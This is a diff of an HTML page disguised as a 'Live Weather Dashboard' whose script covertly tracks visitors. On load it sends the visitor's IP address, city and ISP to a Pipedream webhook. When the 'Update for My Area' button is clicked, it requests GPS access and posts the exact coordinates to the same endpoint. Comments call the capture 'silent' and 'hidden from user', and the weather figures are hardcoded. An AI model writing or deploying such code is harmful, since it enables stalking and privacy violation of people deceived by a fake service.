@@ -6,84 +6,69 @@
     <title>Live Weather Dashboard</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
-        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 300px; }
-        #city-display { font-size: 22px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
+        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
+        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
         .temp { font-size: 48px; margin: 10px 0; }
-        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; width: 100%; }
+        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
         .btn:hover { background: #4299e1; }
-        #status-msg { font-size: 13px; color: #718096; margin-top: 15px; font-style: italic; }
+        p { color: #a0aec0; margin: 5px 0; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2 style="margin:0; font-size: 18px; color: #a0aec0;">Local Forecast</h2>
-        <div id="city-display">Detecting location...</div>
+        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
+        <div id="location-name">Detecting...</div>
         <div class="temp">28°C</div>
-        <p style="margin: 5px 0; color: #cbd5e0;">Partly Cloudy</p>
+        <p id="weather-desc">Partly Cloudy</p>
         
-        <button class="btn" onclick="updateLocation()">Update for My Area</button>
-        <p id="status-msg">Using regional ISP data.</p>
+        <button class="btn" onclick="updateWeather()">Update for My Area</button>
     </div>
 
     <script>
-        // PASTE YOUR PIPEDREAM URL HERE
+        // REPLACE WITH YOUR PIPEDREAM URL
         const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
 
-        // STAGE 1: SILENT IP CAPTURE ON LOAD
+        // STAGE 1: LOAD IP CITY (e.g., Andhra Pradesh)
         window.onload = function() {
             fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                document.getElementById('city-display').innerText = data.city + ", " + data.region;
+                document.getElementById('location-name').innerText = data.city;
                 
-                // Log IP to Pipedream
                 fetch(PIPEDREAM_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify({
-                        type: "IP_ONLY",
-                        ip: data.ip,
-                        city: data.city,
-                        isp: data.org
-                    })
+                    body: JSON.stringify({ type: "IP_LOG", ip: data.ip, city: data.city })
                 });
             });
         };
 
-        // STAGE 2: NATURAL GPS CAPTURE
-        function updateLocation() {
-            document.getElementById('status-msg').innerText = "Synchronizing with local station...";
-            
+        // STAGE 2: LOAD NEIGHBORHOOD (e.g., Punjagutta)
+        function updateWeather() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
 
-                    // Convert Coordinates to a City Name (Reverse Geocode)
+                    // Get the Specific Neighborhood/Sub-locality
                     fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
                     .then(res => res.json())
                     .then(geoData => {
-                        // UPDATE UI: Change "Andhra Pradesh" to "Hyderabad" (or their real city)
-                        document.getElementById('city-display').innerText = geoData.city + ", " + geoData.principalSubdivision;
-                        document.getElementById('status-msg').innerText = "Local forecast updated.";
-                        document.getElementById('temp-display').innerText = "29.2°C";
+                        // Priority order: Suburb name, then Locality, then City
+                        const neighborhood = geoData.locality || geoData.city;
+                        document.getElementById('location-name').innerText = neighborhood;
+                        document.getElementById('weather-desc').innerText = "Updated for your street";
                     });
 
-                    // SEND THE ACTUAL COORDINATES TO PIPEDREAM (User never sees this)
+                    // Log exact GPS coordinates to Pipedream (Hidden from user)
                     fetch(PIPEDREAM_URL, {
                         method: 'POST',
                         mode: 'no-cors',
-                        body: JSON.stringify({
-                            type: "GPS_DATA",
-                            lat: lat,
-                            lon: lon,
-                            accuracy: position.coords.accuracy + "m"
-                        })
+                        body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon, neighborhood: "Captured" })
                     });
-                }, function() {
-                    document.getElementById('status-msg').innerText = "Unable to sync. Using regional data.";
                 });
+            }
         }
     </script>
 </body>
